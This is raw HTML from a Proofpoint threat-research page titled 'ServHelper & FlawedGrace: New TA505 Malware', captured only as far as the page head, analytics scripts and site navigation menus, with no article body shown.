


<!DOCTYPE html>
<html lang="en-us" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# " class="page-en">
  <head>
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MGR7P8X');</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-B1V8SZE3GL"></script>
<script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B1V8SZE3GL');</script>
<script>(function(){var a=window.mutiny=window.mutiny||{};if(!window.mutiny.client){a.client={_queue:{}};var b=["identify","trackConversion"];var c=[].concat(b,["defaultOptOut","optOut","optIn"]);var d=function factory(c){return function(){for(var d=arguments.length,e=new Array(d),f=0;f<d;f++){e[f]=arguments[f]}a.client._queue[c]=a.client._queue[c]||[];if(b.includes(c)){return new Promise(function(b,d){a.client._queue[c].push({args:e,resolve:b,reject:d})})}else{a.client._queue[c].push({args:e})}}};c.forEach(function(b){a.client[b]=d(b)})}})();</script>
<script data-cfasync="false" src="https://client-registry.mutinycdn.com/personalize/client/d454424c4514a20a.js"></script>
<meta charset="utf-8" />
<meta name="description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505. Learn more about these threat actor campaigns." />
<link rel="canonical" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<link rel="shortlink" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<link rel="image_src" href="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png.webp?itok=zuSj9vhS" />
<link rel="icon" href="/themes/custom/proofpoint/apps/drupal/favicon.ico" />
<link rel="mask-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon.svg" />
<link rel="icon" sizes="16x16" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-16x16.png" />
<link rel="icon" sizes="32x32" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-32x32.png" />
<link rel="icon" sizes="96x96" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-96x96.png" />
<link rel="icon" sizes="192x192" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-192x192.png" />
<link rel="apple-touch-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-60x60.png" />
<link rel="apple-touch-icon" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<link rel="apple-touch-icon" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<link rel="apple-touch-icon" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<link rel="apple-touch-icon" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<link rel="apple-touch-icon-precomposed" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon-precomposed" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<meta property="og:site_name" content="Proofpoint" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<meta property="og:title" content="ServHelper &amp; FlawedGrace: New TA505 Malware | Proofpoint US" />
<meta property="og:description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505. Learn more about these threat actor campaigns." />
<meta property="og:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png.webp?itok=zuSj9vhS" />
<meta property="og:image:url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png.webp?itok=zuSj9vhS" />
<meta property="og:image:secure_url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png.webp?itok=zuSj9vhS" />
<meta property="article:published_time" content="2019-01-09T09:25:30-08:00" />
<meta property="article:modified_time" content="2024-10-17T09:15:34-07:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="ServHelper &amp; FlawedGrace: New TA505 Malware | Proofpoint US" />
<meta name="twitter:site" content="@proofpoint" />
<meta name="twitter:description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505. Learn more about these threat actor campaigns." />
<meta name="twitter:url" content="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<meta name="twitter:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png.webp?itok=zuSj9vhS" />
<script data-cfasync="false" type="text/javascript" id="vwoCode">window._vwo_code=window._vwo_code || (function() {
      var account_id=1002484,
      version=1.3,
      settings_tolerance=2000,
      library_tolerance=2500,z
      use_existing_jquery=false,
      is_spa=1,
      hide_element='body',
      /* DO NOT EDIT BELOW THIS LINE */
      f=false,d=document,code={use_existing_jquery:function(){return use_existing_jquery},library_tolerance:function(){return library_tolerance},finish:function(){if(!f){f=true;var e=d.getElementById('_vis_opt_path_hides');if(e)e.parentNode.removeChild(e)}},finished:function(){return f},load:function(e){var t=d.createElement('script');t.fetchPriority='high';t.src=e;t.type='text/javascript';t.innerText;t.onerror=function(){_vwo_code.finish()};d.getElementsByTagName('head')[0].appendChild(t)},init:function(){window.settings_timer=setTimeout(function(){_vwo_code.finish()},settings_tolerance);var e=d.createElement('style'),t=hide_element?hide_element+'{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}':'',i=d.getElementsByTagName('head')[0];e.setAttribute('id','_vis_opt_path_hides');e.setAttribute('nonce',document.querySelector('#vwoCode').nonce);e.setAttribute('type','text/css');if(e.styleSheet)e.styleSheet.cssText=t;else e.appendChild(d.createTextNode(t));i.appendChild(e);this.load('https://dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&f='+ +is_spa+'&vn='+version);return settings_timer}};window._vwo_settings_timer = code.init();return code;}());</script>
<meta name="facebook-domain-verification" content="l349mr2tyecyl7w3a1146378lqxru1" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/proofpoint.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Regular-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Bold-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="alternate" hreflang="en-us" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />

    <title>ServHelper &amp; FlawedGrace: New TA505 Malware | Proofpoint US</title>
    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_lU4Ioaf3R6UrS0uGXtit16d46yiN0qAsRSfzbn2WSZg.css?delta=0&amp;language=en&amp;theme=particle&amp;include=eJxVj0EOAyEIRS80xkVPBJaxpigTwEl6-9p0oa4ID_L4uAgjaPR_PexjTjUiGB0XqJfEFJPo0mWRzBROaW6TniJOGu7HRMiSV0lzah4uyKTbUnoH62hJC1LA7i5tzl8Ez9IWD-ogSXtF209NyeSL93dn1464De7lMRYEDsRUR1D7ApFWbSI" />
<link rel="stylesheet" media="all" href="/sites/default/files/css/css_kNBflpplxurR8MuEncwxsmIY99rl7i0aoXWJJaNo-9c.css?delta=1&amp;language=en&amp;theme=particle&amp;include=eJxVj0EOAyEIRS80xkVPBJaxpigTwEl6-9p0oa4ID_L4uAgjaPR_PexjTjUiGB0XqJfEFJPo0mWRzBROaW6TniJOGu7HRMiSV0lzah4uyKTbUnoH62hJC1LA7i5tzl8Ez9IWD-ogSXtF209NyeSL93dn1464De7lMRYEDsRUR1D7ApFWbSI" />

    <script src="/sites/default/files/js/js_L66B4ykoym9_-33ZMf8UzW3ch3MFFdemzlbHNsNeMWI.js?scope=header&amp;delta=0&amp;language=en&amp;theme=particle&amp;include=eJxNjVEKwzAMQy-0Yva32xTH82LTxA6Oc_-tZbD9CCTxpDF2vT8MGlpdWHl7cjKlx22MvWMcnA59GcmhdmaTMUhgpbZ5-hTuDOneCn4gjFRqDOTBfzUWw1LU6jUhGAyXpuj8Qd-_7eXR38ApO00"></script>
<script src="https://platform-api.sharethis.com/js/sharethis.js#property=6543fd1a2398960013d900a7&amp;product=inline-share-buttons&amp;source=platform"></script>

  </head>
  <body class="path-node user-anonymous">
        <a href="#main-content" class="visually-hidden focusable">
      Skip to main content
    </a>
    <div class="limit-width-wrapper">
      
        <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
    
  

  
  
  
  


<div class="header-nav__spacer"></div>
<div class="header-nav js-is-top">
	<div class="header-nav__extra">
		<div class="header-nav__extra-wrap">
			<div class="header-nav__top-language" data-open="content:x_lng">
				<span>English (Americas)</span>
			</div>
			<div class="header-nav__actions">
				<div class="header-nav__top-search" data-open="content:x_sch">
					<span>Search</span>
				</div>
				<div class="header-nav__top-login" data-open="content:x_lgn">
					<span>Login</span>
				</div>
			</div>
		</div>
	</div>
	<div class="header-nav__main">
		<div class="header-nav__main-wrap">
			<div class="header-nav__expand" data-open="home"></div>
			<ul class="header-nav__top-links">
																						<li class="header-nav__top-link">
								<div data-open="content:platform_panel" class="header-nav__top-link-text">
									Platform
								</div>
							</li>
																																	<li class="header-nav__top-link">
								<div data-open="content:products_panel" class="header-nav__top-link-text">
									Products
								</div>
							</li>
																																	<li class="header-nav__top-link">
								<div data-open="content:solutions_panel" class="header-nav__top-link-text">
									Solutions
								</div>
							</li>
																																													</ul>
			<a href="/us" class="header-nav__logo">Proofpoint</a>
			<div class="header-nav__buttons">
									

    


  <a href=/us/contact class="global-elements__cta-button--outline header-nav__button" >
    <span>Contact</span>
    <div class="global-elements__cta-button--arrow-wrapper"></div>
  </a>


							</div>
			<div class="header-nav__mobile-actions">
				<div class="header-nav__mobile-search" data-open="content:x_sch">Search</div>
				<div class="header-nav__mobile-menu" data-open="home"></div>
			</div>
		</div>
	</div>
</div>

<div class="header-nav__menu">
	<div class="header-nav__menu-wrapper">
		<div class="header-nav__menu-close"></div>
		<div class="header-nav__menu-pane" data-home={true}>
			<ul class="header-nav__home-links">
				                      <li class="header-nav__home-link" data-open="content:platform_panel" ><span>Platform</span></li>
          				                      <li class="header-nav__home-link" data-open="content:products_panel" ><span>Products</span></li>
          				                      <li class="header-nav__home-link" data-open="content:solutions_panel" ><span>Solutions</span></li>
          				                      <li class="header-nav__home-link" data-open="content:partners_panel" ><span>Partners</span></li>
          				                      <li class="header-nav__home-link" data-open="content:resources_panel" ><span>Resources</span></li>
          				                      <li class="header-nav__home-link" data-open="content:company_panel" ><span>Company</span></li>
          							</ul>
			<div class="header-nav__menu-extras">
				<div class="header-nav__menu-search" data-open="content:x_sch">Search</div>
				<div class="header-nav__menu-login" data-open="content:x_lgn">Login</div>
				<div class="header-nav__menu-language" data-open="content:x_lng">English (Americas)</div>
			</div>
		</div>
					<div class="header-nav__menu-pane" data-sublinks="Platform">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Platform</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
					<div class="header-nav__menu-pane" data-sublinks="Products">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Products</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
					<div class="header-nav__menu-pane" data-sublinks="Solutions">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Solutions</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
					<div class="header-nav__menu-pane" data-sublinks="Partners">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Partners</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
					<div class="header-nav__menu-pane" data-sublinks="Resources">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Resources</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
					<div class="header-nav__menu-pane" data-sublinks="Company">
				<div class="header-nav__sublinks">
					<div class="header-nav__expand-title">Company</div>
					<ul class="header-nav__expand-links">
											</ul>
				</div>
			</div>
							<div class="header-nav__menu-pane" data-content="products_panel">
				<div class="header-nav__content">
																																												                                 <a href="/us/products/protect-people" class="header-nav__content-link-group-anchor">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Protect People</div>
                    									    <div class="header-nav__content-group-desc">Multi-layered, adaptive defenses for threat detection, impersonation, and supplier risk.</div>
                                      </div>
                   </a>                 						                                <div class="header-nav__content-link">
                                          <a href="/us/products/threat-defense" class="header-nav__content-link-text">Email Security</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/impersonation-protection" class="header-nav__content-link-text">Impersonation Protection</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:products_more_tp_products_panel">More products</a>
                                                          </div>
              						                                 <a href="/us/products/defend-data" class="header-nav__content-link-group-anchor">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Defend Data</div>
                    									    <div class="header-nav__content-group-desc">Transform your information protection with a human-centric, omni-channel approach.</div>
                                      </div>
                   </a>                 						                                <div class="header-nav__content-link">
                                          <a href="/us/products/data-security-posture-management" class="header-nav__content-link-text">Data Security Posture Management</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/data-loss-prevention" class="header-nav__content-link-text">Enterprise DLP</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/adaptive-email-dlp" class="header-nav__content-link-text">Adaptive Email DLP</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/insider-threat-management" class="header-nav__content-link-text">Insider Threat Management</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/compliance-and-archiving" class="header-nav__content-link-text">Intelligent Compliance</a>
                                                          </div>
              						                                                  <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Mitigate Human Risk</div>
                    									    <div class="header-nav__content-group-desc">Unlock full user risk visibility and drive behavior change.</div>
                                      </div>
                                  						                                <div class="header-nav__content-link">
                                          <a href="/us/products/mitigate-human-risk" class="header-nav__content-link-text">Security Awareness</a>
                                                          </div>
              						                                                  <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Augment Your Capabilities</div>
                                      </div>
                                  						                                <div class="header-nav__content-link">
                                          <a href="/us/products/premium-services" class="header-nav__content-link-text">Managed Services</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/packages" class="header-nav__content-link-text">Product Packages</a>
                                                          </div>
              						                                <div class="header-nav__content-link-spacer"></div>
                																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="products_more_tp_products_panel">
				<div class="header-nav__content">
																	 <div class="header-nav__content-heading">More Protect People Products</div> 																											                                <div class="header-nav__content-link">
                                          <a href="/us/products/identity-protection" class="header-nav__content-link-text">Account Take-Over and Identity Protection</a>
                                                              <div class="header-nav__content-link-desc">Secure vulnerable identities, stop lateral movement and privilege escalation.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/adaptive-email-security" class="header-nav__content-link-text">Adaptive Email Security</a>
                                                              <div class="header-nav__content-link-desc">Stop more threats with a fully integrated layer of behavioral AI.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/email-protection/email-fraud-defense" class="header-nav__content-link-text">Email Fraud Defense</a>
                                                              <div class="header-nav__content-link-desc">Protect your brand reputation, increase deliverability and identify lookalikes of your domains.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/products/email-security-and-protection/secure-email-relay" class="header-nav__content-link-text">Secure Email Relay</a>
                                                              <div class="header-nav__content-link-desc">Secure your application email and accelerate DMARC implementation.</div>
                                      </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="solutions_panel">
				<div class="header-nav__content">
																																												                                                  <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Solutions by Use Case</div>
                    									    <div class="header-nav__content-group-desc">How Proofpoint protects your people and data.</div>
                                      </div>
                                  						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/ensure-acceptable-genai-use" class="header-nav__content-link-text">Ensure Acceptable GenAI Use</a>
                                                              <div class="header-nav__content-link-desc">Empower your workforce with safe GenAI practices.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/email-authentication-with-dmarc" class="header-nav__content-link-text">Authenticate Your Email</a>
                                                              <div class="header-nav__content-link-desc">Protect your email deliverability with DMARC.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/combat-email-and-cloud-threats" class="header-nav__content-link-text">Combat Email and Cloud Threats</a>
                                                              <div class="header-nav__content-link-desc">Protect your people from email and cloud threats with an intelligent and holistic approach.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:solutions_by_use_case_panel">More use cases</a>
                                                          </div>
              						                                                  <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Solutions by Industry</div>
                    									    <div class="header-nav__content-group-desc">People-centric solutions for your organization.</div>
                                      </div>
                                  						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/federal" class="header-nav__content-link-text">Federal Government</a>
                                                              <div class="header-nav__content-link-desc">Cybersecurity for federal government agencies.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/state-and-local-government" class="header-nav__content-link-text">State and Local Government</a>
                                                              <div class="header-nav__content-link-desc">Protecting the public sector, and the public from cyber threats.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:solutions_by_industry_panel">More industries</a>
                                                          </div>
              						                                 <a href="/us/compare" class="header-nav__content-link-group-anchor">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Comparing Proofpoint</div>
                    									    <div class="header-nav__content-group-desc">Evaluating cybersecurity vendors? Check out our side-by-side comparisons.</div>
                                      </div>
                   </a>                 						                                <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:compare_proofpoint_panel">View comparisons</a>
                                                          </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="solutions_by_use_case_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Solutions By Use Case</h3> 						 <div class="header-nav__content-heading">How Proofpoint protects your people and data.</div> 																											                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/change-user-behavior" class="header-nav__content-link-text">Change User Behavior</a>
                                                              <div class="header-nav__content-link-desc">Help your employees identify, resist and report attacks before the damage is done.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/combat-data-loss-and-insider-risk" class="header-nav__content-link-text">Combat Data Loss and Insider Risk</a>
                                                              <div class="header-nav__content-link-desc">Prevent data loss via negligent, compromised and malicious insiders.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/enable-intelligent-compliance" class="header-nav__content-link-text">Modernize Compliance and Archiving</a>
                                                              <div class="header-nav__content-link-desc">Manage risk and data retention needs with a modern compliance and archiving solution.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/protect-cloud-apps" class="header-nav__content-link-text">Protect Cloud Apps</a>
                                                              <div class="header-nav__content-link-desc">Keep your people and their cloud apps secure by eliminating threats and data loss.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/prevent-loss-from-ransomware" class="header-nav__content-link-text">Prevent Loss from Ransomware</a>
                                                              <div class="header-nav__content-link-desc">Learn about this growing threat and stop attacks by securing ransomware&#039;s top vector: email.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/secure-microsoft-365" class="header-nav__content-link-text">Secure Microsoft 365</a>
                                                              <div class="header-nav__content-link-desc">Implement the best security and compliance solution for Microsoft 365.</div>
                                      </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="solutions_by_industry_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Solutions By Industry</h3> 						 <div class="header-nav__content-heading">People-centric solutions for your organization.</div> 																											                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/higher-education-security" class="header-nav__content-link-text">Higher Education</a>
                                                              <div class="header-nav__content-link-desc">A higher level of security for higher education.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/financial-services-and-insurance" class="header-nav__content-link-text">Financial Services</a>
                                                              <div class="header-nav__content-link-desc">Eliminate threats, build trust and foster growth for your organization.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/healthcare-information-security" class="header-nav__content-link-text">Healthcare</a>
                                                              <div class="header-nav__content-link-desc">Protect clinicians, patient data, and your intellectual property against advanced threats.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/mobile-message-security-solutions-for-service-providers" class="header-nav__content-link-text">Mobile Operators</a>
                                                              <div class="header-nav__content-link-desc">Make your messaging environment a secure environment.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/email-security-solutions-for-service-providers" class="header-nav__content-link-text">Internet Service Providers</a>
                                                              <div class="header-nav__content-link-desc">Cloudmark email protection.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/solutions/protection-compliance-small-business" class="header-nav__content-link-text">Small and Medium Businesses</a>
                                                              <div class="header-nav__content-link-desc">Big-time security for small business.</div>
                                      </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="compare_proofpoint_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Proofpoint vs. the competition</h3> 						 <div class="header-nav__content-heading">Side-by-side comparisons.</div> 																											                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-abnormal-security" class="header-nav__content-link-text">Proofpoint vs. Abnormal Security</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-mimecast" class="header-nav__content-link-text">Proofpoint vs. Mimecast</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-cisco" class="header-nav__content-link-text">Proofpoint vs. Cisco</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-microsoft" class="header-nav__content-link-text">Proofpoint vs Microsoft</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-microsoft-purview" class="header-nav__content-link-text">Proofpoint vs. Microsoft Purview</a>
                                                          </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-legacy-dlp" class="header-nav__content-link-text">Proofpoint vs. Legacy DLP</a>
                                                          </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="partners_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Partners</h3> 						 <div class="header-nav__content-heading">Deliver Proofpoint solutions to your customers.</div> 													

  


  <a href=https://partners.proofpoint.com class="global-elements__cta-button header-nav__content-button" >
    <span>Become a Partner</span>
    <div class="global-elements__cta-button--arrow-wrapper"></div>
  </a>


																											                                <div class="header-nav__content-link">
                                          <a href="/us/partners/trusted-data-solutions-partnership" class="header-nav__content-link-text">Archive Extraction Partners</a>
                                                              <div class="header-nav__content-link-desc">Learn about Extraction Partners.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/global-system-integrator-gsi-and-global-managed-service-provider-msp-partners" class="header-nav__content-link-text">GSI Partners</a>
                                                              <div class="header-nav__content-link-desc">Learn about our global consulting.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/partners/technology-alliance-partners" class="header-nav__content-link-text">Technology and Alliance Partners</a>
                                                              <div class="header-nav__content-link-desc">Learn about our relationships.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/partners/digital-risk-and-compliance-partners" class="header-nav__content-link-text">Social Media Protection Partners</a>
                                                              <div class="header-nav__content-link-desc">Learn about the technology and....</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/partners/msp" class="header-nav__content-link-text">MSP Partners</a>
                                                              <div class="header-nav__content-link-desc">Learn about our MSP solutions.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="https://partners.proofpoint.com" class="header-nav__content-link-text">Portal Login</a>
                                                          </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="resources_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Resources</h3> 						 <div class="header-nav__content-heading">Find reports, webinars, blogs, events, podcasts and more.</div> 													

  


  <a href=/us/resources class="global-elements__cta-button header-nav__content-button" >
    <span>Resource Library</span>
    <div class="global-elements__cta-button--arrow-wrapper"></div>
  </a>


																											                                <div class="header-nav__content-link">
                                          <a href="/us/blog" class="header-nav__content-link-text">Blog</a>
                                                              <div class="header-nav__content-link-desc">Keep up with the latest news and happenings.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/webinars" class="header-nav__content-link-text">Webinars</a>
                                                              <div class="header-nav__content-link-desc">Browse our webinar library to learn about the latest threats, trends and issues in cybersecurity.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/cybersecurity-academy" class="header-nav__content-link-text">Cybersecurity Academy</a>
                                                              <div class="header-nav__content-link-desc">Earn your certification to become a Proofpoint Certified Guardian.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/podcasts" class="header-nav__content-link-text">Podcasts</a>
                                                              <div class="header-nav__content-link-desc">Learn about the human side of cybersecurity.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/new-perimeters" class="header-nav__content-link-text">New Perimeters Magazine</a>
                                                              <div class="header-nav__content-link-desc">Get the latest cybersecurity insights in your hands.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/threat-reference" class="header-nav__content-link-text">Threat Glossary</a>
                                                              <div class="header-nav__content-link-desc">Learn about the latest security threats.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/events" class="header-nav__content-link-text">Events</a>
                                                              <div class="header-nav__content-link-desc">Connect with us at events to learn how to protect your people and data from ever-evolving threats.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/customer-stories" class="header-nav__content-link-text">Customer Stories</a>
                                                              <div class="header-nav__content-link-desc">Read how our customers solve their most pressing cybersecurity challenges.</div>
                                      </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="company_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Company</h3> 						 <div class="header-nav__content-heading">Proofpoint protects organizations' greatest assets and biggest risks: their people.</div> 													

  


  <a href=/us/company/about class="global-elements__cta-button header-nav__content-button" >
    <span>About Proofpoint</span>
    <div class="global-elements__cta-button--arrow-wrapper"></div>
  </a>


																											                                <div class="header-nav__content-link">
                                          <a href="/us/why-proofpoint" class="header-nav__content-link-text">Why Proofpoint</a>
                                                              <div class="header-nav__content-link-desc">Learn about our unique people-centric approach to protection.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/company/careers" class="header-nav__content-link-text">Careers</a>
